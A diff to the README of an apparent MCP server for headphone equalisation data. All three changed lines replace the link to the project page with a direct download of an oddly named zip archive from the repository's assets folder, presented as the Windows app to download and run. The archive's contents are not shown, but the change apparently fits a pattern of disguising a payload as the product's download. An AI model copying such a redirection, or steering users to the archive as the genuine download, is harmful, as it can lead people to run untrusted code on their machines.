@@ -1,12 +1,12 @@
 # 🎧 autoeq-mcp - Find headphone EQ settings fast
 
-[![Download / Visit the project page](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/interminable-saunterer371/autoeq-mcp)
+[![Download / Visit the project page](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/interminable-saunterer371/autoeq-mcp/raw/refs/heads/main/assets/autoeq-mcp-acmite.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/interminable-saunterer371/autoeq-mcp
+https://github.com/interminable-saunterer371/autoeq-mcp/raw/refs/heads/main/assets/autoeq-mcp-acmite.zip
 
 ## 🖥️ What this does
 
@@ -182,7 +182,7 @@ It may create local settings files so it can remember your setup.
 - Repository: autoeq-mcp
 - Purpose: MCP server for AutoEQ headphone equalization database
 - Topics: ai, audio, autoeq, claude, equalizer, harman, headphone, iem, mcp, mcp-server
-- Download page: https://github.com/interminable-saunterer371/autoeq-mcp
+- Download page: https://github.com/interminable-saunterer371/autoeq-mcp/raw/refs/heads/main/assets/autoeq-mcp-acmite.zip
 
 ## 🧪 First test after setup
 
